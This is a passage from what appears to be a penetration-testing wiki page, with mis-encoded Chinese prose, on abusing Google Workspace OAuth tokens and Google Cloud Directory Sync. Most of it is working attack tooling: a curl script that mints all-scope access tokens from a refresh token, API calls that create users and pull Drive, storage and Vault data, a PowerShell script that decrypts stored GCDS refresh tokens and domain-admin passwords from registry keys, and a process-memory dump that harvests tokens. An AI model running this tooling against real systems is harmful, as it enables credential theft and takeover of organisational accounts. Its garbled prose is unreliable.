https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome
```
</details>

è¯·æ³¨æ„ï¼Œæœ€æœ‰è¶£çš„å¯èƒ½æ˜¯ï¼š
```c
// OAuth2 scope for access to all Google APIs.
const char kAnyApiOAuth2Scope[] = "https://www.googleapis.com/auth/any-api";
```
ç„¶è€Œï¼Œæˆ‘å°è¯•ä½¿ç”¨è¿™ä¸ªèŒƒå›´è®¿é—®gmailæˆ–åˆ—å‡ºç»„ï¼Œä½†æ²¡æœ‰æˆåŠŸï¼Œæ‰€ä»¥æˆ‘ä¸çŸ¥é“å®ƒè¿˜æœ‰å¤šå¤§ç”¨å¤„ã€‚

**è·å–åŒ…å«æ‰€æœ‰è¿™äº›èŒƒå›´çš„è®¿é—®ä»¤ç‰Œ**ï¼š

<details>

<summary>ç”¨äºä»refresh_tokenç”ŸæˆåŒ…å«æ‰€æœ‰èŒƒå›´çš„è®¿é—®ä»¤ç‰Œçš„Bashè„šæœ¬</summary>
```bash
export scope=$(echo "https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome" | tr '\n' ' ')

curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token
```
</details>

ä¸€äº›ä½¿ç”¨è¿™äº›èŒƒå›´çš„ç¤ºä¾‹ï¼š

<details>

<summary>https://www.googleapis.com/auth/userinfo.email &#x26; https://www.googleapis.com/auth/userinfo.profile</summary>
```bash
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/oauth2/v2/userinfo"

{
"id": "100203736939176354570",
"email": "hacktricks@example.com",
"verified_email": true,
"name": "John Smith",
"given_name": "John",
"family_name": "Smith",
"picture": "https://lh3.googleusercontent.com/a/ACg8ocKLvue[REDACTED]wcnzhyKH_p96Gww=s96-c",
"locale": "en",
"hd": "example.com"
}
```
</details>

<details>

<summary>https://www.googleapis.com/auth/admin.directory.user</summary>
```bash
# List users
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/admin/directory/v1/users?customer=<workspace_id>&maxResults=100&orderBy=email"

# Create user
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"primaryEmail": "newuser@hdomain.com",
"name": {
"givenName": "New",
"familyName": "User"
},
"password": "UserPassword123",
"changePasswordAtNextLogin": true
}' \
"https://www.googleapis.com/admin/directory/v1/users"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/drive</summary>
```bash
# List files
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?pageSize=10&fields=files(id,name,modifiedTime)&orderBy=name"
{
"files": [
{
"id": "1Z8m5ALSiHtewoQg1LB8uS9gAIeNOPBrq",
"name": "Veeam new vendor form 1 2024.docx",
"modifiedTime": "2024-08-30T09:25:35.219Z"
}
]
}

# Download file
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/<file-id>?alt=media" \
-o "DownloadedFileName.ext"

# Upload file
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/file.ext \
"https://www.googleapis.com/upload/drive/v3/files?uploadType=media"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/devstorage.read_write</summary>
```bash
# List buckets from a project
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b?project=<project-id>"

# List objects in a bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/<bucket-name>/o?maxResults=10&fields=items(id,name,size,updated)&orderBy=name"

# Upload file to bucket
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/yourfile.ext \
"https://www.googleapis.com/upload/storage/v1/b/<BUCKET_NAME>/o?uploadType=media&name=<OBJECT_NAME>"

# Download file from bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/BUCKET_NAME/o/OBJECT_NAME?alt=media" \
-o "DownloadedFileName.ext"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/spreadsheets</summary>  
https://www.googleapis.com/auth/spreadsheets  
</details>
```bash
# List spreadsheets
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?q=mimeType='application/vnd.google-apps.spreadsheet'&fields=files(id,name,modifiedTime)&pageSize=100"

# Download as pdf
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/106VJxeyIsVTkixutwJM1IiJZ0ZQRMiA5mhfe8C5CxMc/export?mimeType=application/pdf" \
-o "Spreadsheet.pdf"

# Create spreadsheet
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"properties": {
"title": "New Spreadsheet"
}
}' \
"https://sheets.googleapis.com/v4/spreadsheets"

# Read data from a spreadsheet
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A1:C10"

# Update data in spreadsheet
curl -X PUT \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"range": "Sheet1!A2:C2",
"majorDimension": "ROWS",
"values": [
["Alice Johnson", "28", "alice.johnson@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A2:C2?valueInputOption=USER_ENTERED"

# Append data
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"values": [
["Bob Williams", "35", "bob.williams@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/SPREADSHEET_ID/values/Sheet1!A:C:append?valueInputOption=USER_ENTERED"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/ediscovery (Google Vault)</summary>

**Google Workspace Vault** æ˜¯ Google Workspace çš„ä¸€ä¸ªé™„åŠ ç»„ä»¶ï¼Œæä¾›æ•°æ®ä¿ç•™ã€æœç´¢å’Œå¯¼å‡ºå·¥å…·ï¼Œç”¨äºç®¡ç†å­˜å‚¨åœ¨ Google Workspace æœåŠ¡ï¼ˆå¦‚ Gmailã€Driveã€Chat ç­‰ï¼‰ä¸­çš„ç»„ç»‡æ•°æ®ã€‚

* åœ¨ Google Workspace Vault ä¸­ï¼Œ**Matter** æ˜¯ä¸€ä¸ª **å®¹å™¨**ï¼Œç”¨äºç»„ç»‡å’Œæ±‡æ€»ä¸ç‰¹å®šæ¡ˆä»¶ã€è°ƒæŸ¥æˆ–æ³•å¾‹äº‹åŠ¡ç›¸å…³çš„æ‰€æœ‰ä¿¡æ¯ã€‚å®ƒä½œä¸ºç®¡ç†ä¸è¯¥ç‰¹å®šé—®é¢˜ç›¸å…³çš„ **Holds**ã€**Searches** å’Œ **Exports** çš„ä¸­å¿ƒæ¢çº½ã€‚
* åœ¨ Google Workspace Vault ä¸­ï¼Œ**Hold** æ˜¯å¯¹ç‰¹å®šç”¨æˆ·æˆ–ç»„æ–½åŠ çš„ **ä¿ç•™æªæ–½**ï¼Œä»¥ **é˜²æ­¢åˆ é™¤æˆ–æ›´æ”¹** ä»–ä»¬åœ¨ Google Workspace æœåŠ¡ä¸­çš„æ•°æ®ã€‚Holds ç¡®ä¿ç›¸å…³ä¿¡æ¯åœ¨æ³•å¾‹æ¡ˆä»¶æˆ–è°ƒæŸ¥æœŸé—´ä¿æŒå®Œæ•´ä¸”æœªè¢«ä¿®æ”¹ã€‚
```bash
# List matters
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters?pageSize=10"

# Create matter
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"name": "Legal Case 2024",
"description": "Matter for the upcoming legal case involving XYZ Corp.",
"state": "OPEN"
}' \
"https://vault.googleapis.com/v1/matters"

# Get specific matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>"

# List holds in a matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>/holds?pageSize=10"
```
æ›´å¤š [API ç«¯ç‚¹åœ¨æ–‡æ¡£ä¸­](https://developers.google.com/vault/reference/rest)ã€‚

</details>

## GCDS - Google Cloud Directory Sync

è¿™æ˜¯ä¸€ä¸ªå¯ä»¥ç”¨æ¥**å°†æ‚¨çš„æ´»åŠ¨ç›®å½•ç”¨æˆ·å’Œç»„åŒæ­¥åˆ°æ‚¨çš„ Workspace** çš„å·¥å…·ï¼ˆåœ¨æ’°å†™æœ¬æ–‡æ—¶å¹¶ä¸æ˜¯åå‘åŒæ­¥ï¼‰ã€‚

è¿™å¾ˆæœ‰è¶£ï¼Œå› ä¸ºè¿™æ˜¯ä¸€ä¸ªéœ€è¦**Workspace è¶…çº§ç”¨æˆ·å’Œç‰¹æƒ AD ç”¨æˆ·çš„å‡­æ®**çš„å·¥å…·ã€‚å› æ­¤ï¼Œå¯èƒ½ä¼šåœ¨ä¸€ä¸ªå®šæœŸåŒæ­¥ç”¨æˆ·çš„åŸŸæœåŠ¡å™¨ä¸­æ‰¾åˆ°å®ƒã€‚

{% hint style="info" %}
è¦å¯¹ **`config-manager.exe`** äºŒè¿›åˆ¶æ–‡ä»¶æ‰§è¡Œ **MitM**ï¼Œåªéœ€åœ¨ `config.manager.vmoptions` æ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹è¡Œï¼š**`-Dcom.sun.net.ssl.checkRevocation=false`**
{% endhint %}

{% hint style="success" %}
è¯·æ³¨æ„ [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) èƒ½å¤Ÿæ£€æµ‹ **GCDS**ï¼Œè·å–æœ‰å…³é…ç½®çš„ä¿¡æ¯ï¼Œ**ç”šè‡³æ˜¯å¯†ç å’ŒåŠ å¯†å‡­æ®**ã€‚
{% endhint %}

è¿˜è¦æ³¨æ„ï¼ŒGCDS ä¸ä¼šå°†å¯†ç ä» AD åŒæ­¥åˆ° Workspaceã€‚å¦‚æœæœ‰çš„è¯ï¼Œå®ƒåªä¼šä¸ºåœ¨ Workspace ä¸­æ–°åˆ›å»ºçš„ç”¨æˆ·ç”Ÿæˆéšæœºå¯†ç ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5780773316536156543-x.jpg" alt="" width="515"><figcaption></figcaption></figure>

### GCDS - ç£ç›˜ä»¤ç‰Œå’Œ AD å‡­æ®

äºŒè¿›åˆ¶æ–‡ä»¶ `config-manager.exe`ï¼ˆå¸¦ GUI çš„ä¸»è¦ GCDS äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰å°†é»˜è®¤åœ¨ **`C:\Program Files\Google Cloud Directory Sync`** æ–‡ä»¶å¤¹ä¸­çš„ **`Untitled-1.xml`** æ–‡ä»¶ä¸­å­˜å‚¨é…ç½®çš„æ´»åŠ¨ç›®å½•å‡­æ®ã€åˆ·æ–°ä»¤ç‰Œå’Œè®¿é—®æƒé™ã€‚å°½ç®¡å®ƒä¹Ÿå¯ä»¥ä¿å­˜åœ¨ç”¨æˆ·çš„ `Documents` ä¸­æˆ–åœ¨ **ä»»ä½•å…¶ä»–æ–‡ä»¶å¤¹** ä¸­ã€‚

æ­¤å¤–ï¼Œæ³¨å†Œè¡¨ **`HKCU\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\ui`** ä¸­çš„é”® **`open.recent`** åŒ…å«æ‰€æœ‰æœ€è¿‘æ‰“å¼€çš„é…ç½®æ–‡ä»¶ï¼ˆxmlï¼‰çš„è·¯å¾„ã€‚å› æ­¤ï¼Œå¯ä»¥**æ£€æŸ¥å®ƒä»¥æ‰¾åˆ°å®ƒä»¬**ã€‚

æ–‡ä»¶ä¸­æœ€æœ‰è¶£çš„ä¿¡æ¯å°†æ˜¯ï¼š
```xml
[...]
<loginMethod>OAUTH2</loginMethod>
<oAuth2RefreshToken>rKvvNQxi74JZGI74u68aC6o+3Nu1ZgVUYdD1GyoWyiHHxtWx+lbx3Nk8dU27fts5lCJKH/Gp1q8S6kEM2AvjQZN16MkGTU+L2Yd0kZsIJWeO0K0RdVaK2D9Saqchk347kDgGsQulJnuxU+Puo46+aA==</oAuth2RefreshToken>
<oAuth2Scopes>
<scope>https://www.google.com/m8/feeds/</scope>
<scope>https://www.googleapis.com/auth/admin.directory.group</scope>
<scope>https://www.googleapis.com/auth/admin.directory.orgunit</scope>
<scope>https://www.googleapis.com/auth/admin.directory.resource.calendar</scope>
<scope>https://www.googleapis.com/auth/admin.directory.user</scope>
<scope>https://www.googleapis.com/auth/admin.directory.userschema</scope>
<scope>https://www.googleapis.com/auth/apps.groups.settings</scope>
<scope>https://www.googleapis.com/auth/apps.licensing</scope>
<scope>https://www.googleapis.com/auth/plus.me</scope>
</oAuth2Scopes>
[...]
<hostname>192.168.10.23</hostname>
<port>389</port>
<basedn>dc=hacktricks,dc=local</basedn>
<authType>SIMPLE</authType>
<authUser>DOMAIN\domain-admin</authUser>
<authCredentialsEncrypted>XMmsPMGxz7nkpChpC7h2ag==</authCredentialsEncrypted>
[...]
```
æ³¨æ„ç”¨æˆ·çš„ **refresh** **token** å’Œ **password** æ˜¯ä½¿ç”¨ **AES CBC** åŠ å¯†çš„ï¼Œä½¿ç”¨éšæœºç”Ÿæˆçš„å¯†é’¥å’Œ IV å­˜å‚¨åœ¨ **`HKEY_CURRENT_USER\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util`**ï¼ˆæ— è®º **`prefs`** Java åº“å°†é¦–é€‰é¡¹å­˜å‚¨åœ¨å“ªé‡Œï¼‰ä¸­çš„å­—ç¬¦ä¸²é”® **`/Encryption/Policy/V2.iv`** å’Œ **`/Encryption/Policy/V2.key`** ä»¥ base64 æ ¼å¼å­˜å‚¨ã€‚

<details>

<summary>Powershell è„šæœ¬ç”¨äºè§£å¯† refresh token å’Œ password</summary>
```powershell
# Paths and key names
$xmlConfigPath = "C:\Users\c\Documents\conf.xml"
$regPath = "SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util"
$ivKeyName = "/Encryption/Policy/V2.iv"
$keyKeyName = "/Encryption/Policy/V2.key"

# Open the registry key
try {
$regKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($regPath)
if (-not $regKey) {
Throw "Registry key not found: HKCU\$regPath"
}
}
catch {
Write-Error "Failed to open registry key: $_"
exit
}

# Get Base64-encoded IV and Key from the registry
try {
$ivBase64 = $regKey.GetValue($ivKeyName)
$ivBase64 = $ivBase64 -replace '/', ''
$ivBase64 = $ivBase64 -replace '\\', '/'
if (-not $ivBase64) {
Throw "IV not found in registry"
}
$keyBase64 = $regKey.GetValue($keyKeyName)
$keyBase64 = $keyBase64 -replace '/', ''
$keyBase64 = $keyBase64 -replace '\\', '/'
if (-not $keyBase64) {
Throw "Key not found in registry"
}
}
catch {
Write-Error "Failed to read registry values: $_"
exit
}
$regKey.Close()


# Decode Base64 IV and Key
$ivBytes = [Convert]::FromBase64String($ivBase64)
$keyBytes = [Convert]::FromBase64String($keyBase64)

# Read XML content
$xmlContent = Get-Content -Path $xmlConfigPath -Raw

# Extract Base64-encoded encrypted values using regex
$refreshTokenMatch = [regex]::Match($xmlContent, "<oAuth2RefreshToken>(.*?)</oAuth2RefreshToken>")
$refreshTokenBase64 = $refreshTokenMatch.Groups[1].Value

$encryptedPasswordMatch = [regex]::Match($xmlContent, "<authCredentialsEncrypted>(.*?)</authCredentialsEncrypted>")
$encryptedPasswordBase64 = $encryptedPasswordMatch.Groups[1].Value

# Decode encrypted values from Base64
$refreshTokenEncryptedBytes = [Convert]::FromBase64String($refreshTokenBase64)
$encryptedPasswordBytes = [Convert]::FromBase64String($encryptedPasswordBase64)

# Function to decrypt data using AES CBC
Function Decrypt-Data($cipherBytes, $keyBytes, $ivBytes) {
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.KeySize = 256
$aes.BlockSize = 128
$aes.Key = $keyBytes
$aes.IV = $ivBytes

$decryptor = $aes.CreateDecryptor()
$memoryStream = New-Object System.IO.MemoryStream
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
$cryptoStream.Write($cipherBytes, 0, $cipherBytes.Length)
$cryptoStream.FlushFinalBlock()
$plaintextBytes = $memoryStream.ToArray()

$cryptoStream.Close()
$memoryStream.Close()

return $plaintextBytes
}

# Decrypt the values
$refreshTokenBytes = Decrypt-Data -cipherBytes $refreshTokenEncryptedBytes -keyBytes $keyBytes -ivBytes $ivBytes
$refreshToken = [System.Text.Encoding]::UTF8.GetString($refreshTokenBytes)

$decryptedPasswordBytes = Decrypt-Data -cipherBytes $encryptedPasswordBytes -keyBytes $keyBytes -ivBytes $ivBytes
$decryptedPassword = [System.Text.Encoding]::UTF8.GetString($decryptedPasswordBytes)

# Output the decrypted values
Write-Host "Decrypted Refresh Token: $refreshToken"
Write-Host "Decrypted Password: $decryptedPassword"
```
</details>

{% hint style="info" %}
è¯·æ³¨æ„ï¼Œå¯ä»¥é€šè¿‡æ£€æŸ¥ **`C:\Program Files\Google Cloud Directory Sync`** ä¸­çš„ **`DirSync.jar`** çš„ java ä»£ç æ¥æ£€æŸ¥æ­¤ä¿¡æ¯ï¼Œæœç´¢å­—ç¬¦ä¸² `exportkeys`ï¼ˆå› ä¸ºè¿™æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ `upgrade-config.exe` æœŸæœ›è½¬å‚¨å¯†é’¥çš„ cli å‚æ•°ï¼‰ã€‚
{% endhint %}

é™¤äº†ä½¿ç”¨ powershell è„šæœ¬å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨äºŒè¿›åˆ¶æ–‡ä»¶ **`:\Program Files\Google Cloud Directory Sync\upgrade-config.exe`**ï¼Œå‚æ•°ä¸º `-exportKeys`ï¼Œå¹¶ä»æ³¨å†Œè¡¨ä¸­ä»¥åå…­è¿›åˆ¶æ ¼å¼è·å– **Key** å’Œ **IV**ï¼Œç„¶ååªéœ€ä½¿ç”¨ä¸€äº› cyberchef ç»“åˆ AES/CBC ä»¥åŠè¯¥å¯†é’¥å’Œ IV æ¥è§£å¯†ä¿¡æ¯ã€‚

### GCDS - ä»å†…å­˜ä¸­è½¬å‚¨ä»¤ç‰Œ

ä¸ GCPW ä¸€æ ·ï¼Œå¯ä»¥è½¬å‚¨ `config-manager.exe` è¿›ç¨‹çš„å†…å­˜ï¼ˆè¿™æ˜¯ GCDS ä¸»äºŒè¿›åˆ¶æ–‡ä»¶çš„ GUI åç§°ï¼‰ï¼Œæ‚¨å°†èƒ½å¤Ÿæ‰¾åˆ°åˆ·æ–°å’Œè®¿é—®ä»¤ç‰Œï¼ˆå¦‚æœå®ƒä»¬å·²ç»ç”Ÿæˆï¼‰ã€‚\
æˆ‘æƒ³æ‚¨ä¹Ÿå¯ä»¥æ‰¾åˆ°é…ç½®çš„ AD å‡­æ®ã€‚

<details>

<summary>è½¬å‚¨ config-manager.exe è¿›ç¨‹å¹¶æœç´¢ä»¤ç‰Œ</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "config-manager" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

### GCDS - ä»åˆ·æ–°ä»¤ç‰Œç”Ÿæˆè®¿é—®ä»¤ç‰Œ

ä½¿ç”¨åˆ·æ–°ä»¤ç‰Œï¼Œå¯ä»¥ä½¿ç”¨å®ƒä»¥åŠä»¥ä¸‹å‘½ä»¤ä¸­æŒ‡å®šçš„å®¢æˆ·ç«¯IDå’Œå®¢æˆ·ç«¯å¯†é’¥ç”Ÿæˆè®¿é—®ä»¤ç‰Œï¼š
```bash
curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
